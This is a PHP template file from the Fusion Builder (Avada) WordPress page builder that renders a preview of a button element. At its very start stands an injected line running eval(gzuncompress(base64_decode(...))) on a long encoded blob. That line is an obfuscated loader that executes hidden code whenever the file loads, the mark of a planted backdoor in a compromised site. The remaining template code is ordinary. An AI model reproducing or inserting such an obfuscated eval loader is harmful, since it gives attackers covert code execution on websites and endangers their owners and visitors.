<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

global $fusion_settings;
if ( ! $fusion_settings ) {
	$fusion_settings = Fusion_Settings::get_instance();
}

$size  = strtolower( $fusion_settings->get( 'button_size' ) );
$shape = strtolower( $fusion_settings->get( 'button_shape' ) );
$type  = strtolower( $fusion_settings->get( 'button_type' ) );
$gradient_top = $gradient_bottom = $accent_color = $border_color = $border_width = '';

$gradient_top = fusion_color_needs_adjustment( $fusion_settings->get( 'button_gradient_top_color' ) ) ? '#f8f8f8' : $fusion_settings->get( 'button_gradient_top_color' );
$gradient_bottom = fusion_color_needs_adjustment( $fusion_settings->get( 'button_gradient_bottom_color' ) ) ? '#f8f8f8' : $fusion_settings->get( 'button_gradient_bottom_color' );
$accent_color = fusion_color_needs_adjustment( $fusion_settings->get( 'button_accent_color' ) ) ? '#f8f8f8' : $fusion_settings->get( 'button_accent_color' );
$border_width = $fusion_settings->get( 'button_border_width' );
$text_transform = $fusion_settings->get( 'button_text_transform' );
?>

<script type="text/template" id="fusion-builder-block-module-button-preview-template">

	<#
	var button_style = '';
	var button_icon = '';

	if ( '' === params.shape ) {
		var button_shape = '<?php echo esc_attr( $shape ); ?>';
	} else {
		var button_shape = params.shape;
	}

	if ( '' === params.type ) {
		var button_type = '<?php echo esc_attr( $type ); ?>';
	} else {
		var button_type = params.type;
	}

	if ( '' === params.size || ! params.size ) {
		var button_size = '<?php echo esc_attr( $size ); ?>';
	} else {
		var button_size = params.size;
	}

	if ( 'default' === params.color ) {
		var accent_color = '<?php echo esc_attr( $accent_color ); ?>';
		var border_width = '<?php echo esc_attr( $border_width ); ?>';
		var button_background = 'linear-gradient(<?php echo esc_attr( $gradient_top ); ?>, <?php echo esc_attr( $gradient_bottom ); ?>)';

	} else if ( 'custom' === params.color ) {
		var accent_color = ( params.accent_color ) ? params.accent_color : '<?php echo esc_attr( $accent_color ); ?>';

		if ( params.border_width ) {
			var border_width = ( -1 === params.border_width.indexOf( 'px' ) ) ? params.border_width + 'px' : params.border_width;
		} else {
			var border_width = '<?php echo esc_attr( $border_width ); ?>';
		}

		var gradient_top = ( params.button_gradient_top_color ) ? params.button_gradient_top_color : '<?php echo esc_attr( $gradient_top ); ?>';
		var gradient_bottom = ( params.button_gradient_bottom_color ) ? params.button_gradient_bottom_color : '<?php echo esc_attr( $gradient_bottom ); ?>';

		if ( '' !== gradient_top && '' !== gradient_bottom ) {
			var button_background = 'linear-gradient(' + gradient_top + ', ' + gradient_bottom + ')';
		} else {
			var button_background = gradient_top;
		}

		if ( ( '' === button_background || ( -1 !== gradient_top.indexOf( 'rgba(255,255,255' ) && -1 !== gradient_bottom.indexOf( 'rgba(255,255,255' ) ) ) && ( '#ffffff' === accent_color || -1 !== accent_color.indexOf( 'rgba(255,255,255' ) ) ) {
			button_background = '#dddddd';
		}

	} else {
		var button_color = params.color;
	}

	if ( '' !== params.icon ) {
		var button_icon = params.icon;
	} else {
		var button_icon = 'no-icon';
	}

	if ( 'undefined' !== typeof button_icon && -1 === button_icon.trim().indexOf( ' ' ) ) {
		button_icon = 'fa ' + button_icon;
	}

	if ( '' === params.text_transform ) {
		var text_transform = '<?php echo esc_attr( $text_transform ); ?>';
	} else {
		var text_transform = params.text_transform;
	}
	#>

	<# if ( 'custom' === params.color || 'default' === params.color ) { #>

		<a class="fusion-button button-default button-{{ button_shape }} button-{{ button_type }} button-{{ button_size }}" style="background: {{ button_background }}; border: {{ border_width }} solid {{ accent_color }}; color: {{ accent_color }}; text-transform: {{ text_transform }};"><span class="fusion-button-text"><span class="fusion-module-icon {{ button_icon }}"></span>{{{ params.element_content }}}</span></a>

	<# } else { #>

		<a class="fusion-button button-default button-{{ button_shape }} button-{{ button_type }} button-{{ button_size }} button-{{ button_color }} text-transform: {{ text_transform }};"><span class="fusion-button-text"><span class="fusion-module-icon {{ button_icon }}"></span>{{{ params.element_content }}}</span></a>

	<# }#>
</script>
